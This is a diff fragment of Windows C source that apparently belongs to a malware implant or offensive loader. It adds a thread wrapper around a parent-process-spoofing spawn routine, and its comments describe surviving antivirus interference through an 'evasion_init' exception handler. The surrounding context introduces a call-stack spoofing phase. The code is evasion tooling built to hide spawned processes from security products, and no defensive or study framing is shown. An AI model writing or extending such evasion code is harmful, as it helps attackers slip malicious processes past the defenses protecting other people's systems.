@@ -158,6 +158,17 @@ int spawn_with_ppid(const char *cmd, const char *parent_name) {
     return 1;
 }
 
+/* Thread wrapper so spawn_with_ppid runs isolated from the main dispatcher.
+ * WaitForSingleObject with timeout in the caller handles hangs (AV-blocking
+ * CreateProcessW); if the thread raises an unhandled exception the process-
+ * level VEH set in evasion_init() logs it and returns CONTINUE_SEARCH so
+ * Windows can terminate the thread but not the whole process.               */
+DWORD WINAPI ppid_worker(LPVOID arg) {
+    PpidWork *w = (PpidWork *)arg;
+    w->ok = spawn_with_ppid(w->cmd, w->parent);
+    return 0;
+}
+
 /* ═══════════════════════════════════════════════════════════════════════════
  * Phase 10: Call-stack spoofing
  *
